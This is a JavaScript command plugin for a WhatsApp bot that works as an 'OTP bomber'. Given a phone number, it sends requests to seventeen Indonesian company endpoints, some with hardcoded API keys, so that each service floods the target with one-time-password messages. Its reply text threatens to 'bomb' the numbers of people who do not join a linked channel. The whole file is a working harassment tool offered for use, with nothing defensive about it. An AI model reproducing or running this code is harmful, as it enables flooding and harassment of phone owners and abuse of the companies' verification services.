import axios from 'axios';

const handler = async (m, { conn, text, usedPrefix, command }) => {
  if (!text) return m.reply(`Gunakan: ${usedPrefix}${command} <nomor hp>`);

  const phoneNumber = text.trim();
  let phone = phoneNumber.replace(/[^0-9]/g, "");
  if (phone.startsWith("0")) phone = "62" + phone.slice(1);
  if (!phone.startsWith("62")) phone = "62" + phone;

  const p08 = "0" + phone.slice(2);
  const p62 = phone;

  const msg = await m.reply('⏳ Sedang mengirim OTP...');

  const otp = [
    { url: "https://matahari-backend-prod.matahari.com/api/auth/re-activation", data: { mobileCountryCode: "", mobileNumber: p08, activationCode: "" } },
    { url: "https://internetrakyat.id/api/app/auth/send-otp-register", data: { phone_number: p08 }, headers: { "x-api-key": "280999!FTTH" } },
    { url: "https://www.bonusbelanja.com/api/auth/registration/app", data: { phone: p62, name: "user", agreeTnc: true, agreeContact: false } },
    { url: "https://www.alodokter.com/resend-otp", data: { user: { phone: p08, uuid: "f6bd0911---b189-" }, request_via: "whatsapp" } },
    { url: "https://api.dokterin.id/user/v1/users/login", data: { phone: p62, tnc_accept: true } },
    { url: "https://api.maulagi.id/api/v2/auth/check", data: { credentials: p08 }, headers: { "X-ML-KEY": "D09ACCPN9" } },
    { url: "https://cms.bunda.co.id/api/v1/auth/send-otp", data: { phone_number: p62.replace("62", ""), country_code: "62", type: "auth" } },
    { url: "https://api.fastwork.id/auth/v2/signup.sendVerificationCode", data: { phone_number: p08 } },
    { url: `https://api.sicepatconsumer.com/v3/masterdata/user/otp/request/${p62}?sms=false`, method: "GET", headers: { "x-recaptcha": "acf49209:" } },
    { url: "https://register.paper.id/api/v1/auth/register/send-otp", data: { phone: p62, method: "whatsapp", registered_by: "web" } },
    { url: "https://www.pinhome.id/api/odyssey/proxy/pinaccount/auth/verification/request-otp", data: { accountType: "customers", applicationType: "Pinhome Web", countryCode: "62", medium: "whatsapp", otpType: "register", phoneNumber: p62.replace("62", "") } },
    { url: "https://www.beautyhaul.com/ajax/account/send_otp", data: { method: "WhatsApp", phone: p62 } },
    { url: "https://account.bliblitiket.com/gateway/gks-unm-go-be/api/v1/otp/generate", data: { action: "REGISTER_OTP", channel: "WHATS_APP", recipient: p62, recaptchaToken: "" } },
    { url: "https://www.rumah123.com/api/otp/request-otp", data: { ipAddress: "36.67.110.51", phoneNumber: p62, portalId: 1, type: "WHATSAPP", url: "https://www.rumah123.com/user/login" }, headers: { "Base-Url-Core": "https://www.rumah123.com" } },
    { url: "https://beta.api.saturdays.com/api/v1/user/otp/send", data: { number: p62.replace("62", ""), country_code: "+62", type: "" }, headers: { "x-api-key": "GCMUDiuY5a7WvyUNt9n3QztToSHzK7Uj", "country-code": "ID" } },
    { url: "https://gateway.gritero.com/v1/auth/registration/whatsapp/send-otp?langcode=id", data: { nama_lengkap: "User", telepon: p08, email: "user@mail.com" }, headers: { "Xid": "1080504480", "source": "ocistok" } },
    { url: "https://prod.adiraku.co.id/ms-auth/auth/generate-otp-vdata", data: { mobileNumber: p62.replace("62", ""), type: "prospect-create", channel: "whatsapp" } }
  ];

  let success = 0;
  let failed = 0;

  for (const ep of otp) {
    try {
      const config = {
        headers: { "Content-Type": "application/json", "User-Agent": "Mozilla/5.0", ...(ep.headers || {}) },
        timeout: 10000
      };
      if (ep.method === "GET") {
        await axios.get(ep.url, config);
      } else {
        await axios.post(ep.url, ep.data, config);
      }
      success++;
    } catch {
      failed++;
    }
  }

  const response = `— otp bomber —
nomor hp :
${phone}
total request :
${otp.length}
berhasil :
${success}
gagal :
${failed}

✓ OTP telah dikirim ke nomor Anda
┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈
*Join gak join nomor lu gw bom😈*
https://whatsapp.com/channel/0029Vb7XYjLKgsNyWrRHL10k
`;

  await conn.sendMessage(m.chat, { delete: msg.key });
  await conn.sendMessage(m.chat, { text: response }, { quoted: m });
};

handler.help = ['otpbomb'];
handler.tags = ['tools'];
handler.command = /^(otpbomb|bombotp)$/i;
handler.premium = true;
handler.register = true;

export default handler;